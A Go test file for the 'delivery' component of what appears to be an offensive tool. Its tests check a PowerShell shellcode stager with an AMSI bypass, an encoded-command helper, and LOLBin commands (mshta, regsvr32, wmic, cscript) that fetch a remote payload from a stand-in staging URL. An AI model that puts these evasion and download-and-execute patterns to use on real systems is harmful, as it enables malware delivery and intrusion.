package delivery

import (
	"encoding/base64"
	"strings"
	"testing"
)

// TestPs1StagerContents asserts the inline PowerShell stager contains the AMSI
// prologue, the Add-Type P/Invoke block, the base64 of the shellcode, and the
// VirtualAlloc/CreateThread sequence — and that the raw shellcode does NOT appear
// in plaintext (it is base64-encoded).
func TestPs1StagerContents(t *testing.T) {
	sc := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04}
	body := ps1StagerBody(sc)
	for _, want := range []string{"AmsiUtils", "VirtualAlloc", "CreateThread", "WaitForSingleObject", "FromBase64String"} {
		if !contains(body, want) {
			t.Errorf("ps1 stager missing %q", want)
		}
	}
	if !contains(body, b64Std(sc)) {
		t.Errorf("ps1 stager missing base64-encoded shellcode")
	}
	if contains(body, string(sc)) {
		t.Error("raw shellcode leaked into ps1 stager")
	}
}

// TestPs1EncRoundTrip verifies the UTF-16LE base64 used for `powershell -enc`
// decodes back to the input one-liner.
func TestPs1EncRoundTrip(t *testing.T) {
	oneLiner := ps1StagerOneLine([]byte{0x11, 0x22, 0x33})
	enc := ps1Enc(oneLiner)
	dec, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	// ps1Enc is base64 of UTF-16LE; reverse to get the original string.
	var sb strings.Builder
	for i := 0; i+1 < len(dec); i += 2 {
		sb.WriteByte(dec[i]) // ASCII one-liners: UTF-16LE low byte == the char
	}
	if sb.String() != oneLiner {
		t.Errorf("ps1Enc round-trip mismatch")
	}
}

// TestLolbinRemotePerLauncher asserts each launcher maps to the right primitive
// and that the url appears in every command.
func TestLolbinRemotePerLauncher(t *testing.T) {
	url := "http://10.0.0.5/stage"
	cases := []struct {
		launcher string
		substr   string
	}{
		{"powershell", "powershell"},
		{"cmd", "cmd /c powershell"},
		{"mshta", "mshta " + url},
		{"regsvr32", "regsvr32 /s /u /i:" + url + " scrobj.dll"},
		{"wmic", `wmic os get /format:"` + url + `"`},
		{"cscript", "cscript //nologo " + url},
		{"", "powershell"}, // default -> powershell
		{"bogus", "powershell"}, // unknown -> powershell fallback
	}
	for _, c := range cases {
		got := lolbinRemote(c.launcher, url)
		if !contains(got, c.substr) {
			t.Errorf("launcher=%q: got %q, want substring %q", c.launcher, got, c.substr)
		}
	}
}